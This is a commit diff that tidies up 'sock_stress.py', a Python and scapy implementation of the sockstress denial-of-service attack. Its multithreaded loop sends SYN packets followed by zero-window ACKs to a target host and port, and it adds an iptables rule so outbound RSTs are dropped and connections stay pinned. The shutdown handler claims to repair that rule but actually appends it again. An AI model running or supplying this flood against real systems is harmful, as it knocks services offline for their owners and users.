aca7ef8bf2e10c8616753803bacf7f4b4de441fb
movatica <c0d3@movatica.com>
2025-01-07 20:59:46 +0100

    Cleanup sockstress implementation with scapy

--- sock_stress.py
+++ sock_stress.py
@@ -12,14 +12,20 @@
  Python 3 port: January 2025 by movatica
 """
 
+from ipaddress import IPv4Address
 import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
-from scapy.all import *
 from time import sleep
 from _thread import start_new_thread
 import os
+from random import randint
 import signal
 import sys
+
+from scapy.error import Scapy_Exception
+from scapy.layers.inet import IP, TCP
+from scapy.sendrecv import send, sr1
+
 
 print("\n*******************************************************")
 print("**  Python Sock Stress DoS                           **")
@@ -36,35 +42,45 @@ if len(sys.argv) != 4:
     print("Make sure you target a port that responds when a connection is made")
     sys.exit()
 
-target = str(sys.argv[1])
+dstaddr = IPv4Address(sys.argv[1])
 dstport = int(sys.argv[2])
 threads = int(sys.argv[3])
 
-## This is where the magic happens
-def sockstress(target,dstport):
+
+def sockstress(dstaddr: IPv4Address, dstport: int) -> None:
+    """ Send SYN-ACK sequence with zero window. """
+    dstaddr = str(dstaddr)
+
     while True:
         try:
-            x = random.randint(0,65535)
-            response = sr1(IP(dst=target)/TCP(sport=x,dport=dstport,flags='S'),timeout=1,verbose=0)
-            send(IP(dst=target)/TCP(dport=dstport,sport=x,window=0,flags='A',ack=(response[TCP].seq + 1))/'\x00\x00',verbose=0)
-        except:
+            srcport = randint(0,65535)
+            response = sr1(
+                    IP(dst=dstaddr) / TCP(sport=srcport,dport=dstport,flags='S'),
+                    timeout=1,
+                    verbose=0)
+            send(
+                    IP(dst=dstaddr) / TCP(sport=srcport,dport=dstport,flags='A',ack=response[TCP].seq+1,window=0) / '\x00\x00',
+                    verbose=0
+                    )
+        except Scapy_Exception:
             pass
+
 
 ## Graceful shutdown allows IP Table Repair
 def graceful_shutdown(signal, frame):
     print('\nYou pressed Ctrl+C!')
     print('Fixing IP Tables')
-    os.system('iptables -A OUTPUT -p tcp --tcp-flags RST RST -d ' + target + ' -j DROP')
+    os.system('iptables -A OUTPUT -p tcp --tcp-flags RST RST -d ' + str(dstaddr) + ' -j DROP')
     sys.exit()
 
 ## Creates IPTables Rule to Prevent Outbound RST Packet to Allow Scapy TCP Connections
-os.system('iptables -A OUTPUT -p tcp --tcp-flags RST RST -d ' + target + ' -j DROP')
+os.system('iptables -A OUTPUT -p tcp --tcp-flags RST RST -d ' + str(dstaddr) + ' -j DROP')
 signal.signal(signal.SIGINT, graceful_shutdown)
 
 ## Spin up multiple threads to launch the attack
 print("The onslaught has begun...use Ctrl+C to stop the attack")
 for _ in range(threads):
-    start_new_thread(sockstress, (target,dstport))
+    start_new_thread(sockstress, (dstaddr,dstport))
 
 ## Make it go FOREVER (...or at least until Ctrl+C)
 while True:
